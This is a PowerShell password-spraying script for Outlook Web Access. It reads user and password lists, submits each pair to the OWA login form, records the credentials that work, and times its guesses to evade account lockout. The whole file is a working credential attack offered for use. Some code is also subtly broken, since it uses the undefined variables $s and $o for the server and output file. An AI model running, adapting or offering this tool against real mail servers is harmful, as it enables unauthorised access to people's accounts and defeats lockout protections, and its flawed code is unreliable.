param (
[alias("u")]
$userfile,
[alias("p")]
$pwdfile,
[alias("s")]
$owaserver,
[alias("o")]
$outfile
)


function helpsyntax {
write-host "pwdspray-OWA - Password Spray for OWA service"
write-host "Parameters:"
write-host "    -u          <input userid file>"
write-host "    -p          <input password file>"
write-host "    -s          <target OWA server - FQDN or IP address only>"
write-host "    -o          <output file name>"
exit
}


if ($userfile.length -eq 0) { write-host "ERROR: Must specify userid file`n" ; helpsyntax }
if ($pwdfile.length -eq 0) { write-host "ERROR: Must specify input password file`n" ; helpsyntax }
if ($owaserver.length -eq 0) { write-host "ERROR: Must specify target OWA server`n" ; helpsyntax }

# read the userid file
# cast the userids variable to be an arraylist, so that we can remove items from it as we match on credentials
[System.Collections.ArrayList]$userids = gc $userfile

#read the password file
$pwds = gc $pwdfile

# to prevent account lockouts, calculate to exceed 3 pwd guesses per user in 5 minutes (or longer).
# per-password-loop timeout is set to 2 minutes, so that worst case we'll hit 3 tries per account in 6 minutes
$timeout = new-timespan -Minutes 2
$timeoutseconds = 120

$url = "https://"+ $s + "/owa"
$authpath = "$url/auth/owaauth.dll"

foreach ($pwd in $pwds) {
    # start the clock on this individual password run
    $tm = [diagnostics.stopwatch]::StartNew()
    foreach ($userid in $userids) {

        # construct the HtmlWebResponseObject
        $wro = Invoke-WebRequest -Uri $url -SessionVariable owa

        # populate the form fields       
        $dbForm = $wro.Forms[0]
        $dbForm.Fields.username = $userid
        $dbForm.Fields.password =  $pwd
       
        # make the web request
        $req = Invoke-WebRequest -Uri $authpath -WebSession $owa -Method Post -Body $dbForm.Fields
        $inbox = $req.AllElements | where {$_.tagName -eq "td"} | select outertext | foreach {$_.outertext}

        # if inbox.length is > 0, credentials are a match
        if ( $inbox.length -gt 0 ) {
           # output result, remove userid from list, print result to screen
           "$userid : $pwd" | out-file $o -append
           $userids.remove($userid)
           write-host "$userid : $pwd - SUCCESS"
           break
           }
           else
           {
           write-host "$userid , $pwd - NO MATCH"
           }
        }
    # wait out the per-pwd-loop clock
    $elapsed = [int]($tm.elapsed.totalseconds)
    if ($elapsed -lt $timeoutseconds) {
        $waittime = $timeoutseconds - $elapsed
        write-host "Waiting $waittime seconds to prevent account lockout"
        start-sleep -seconds $waittime
        }
    }


